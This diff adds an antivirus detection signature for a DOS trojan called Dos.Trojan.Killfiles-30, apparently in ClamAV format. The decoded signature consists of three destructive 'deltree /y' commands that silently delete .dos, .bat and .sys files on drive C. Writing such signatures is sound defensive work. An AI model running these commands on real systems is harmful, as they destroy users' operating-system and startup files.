@@ -1,0 +1,7 @@
+VIRUS NAME: Dos.Trojan.Killfiles-30
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+deltree /y c:\*.dos
+deltree /y c:\*.bat
+deltree /y c:\*.sys
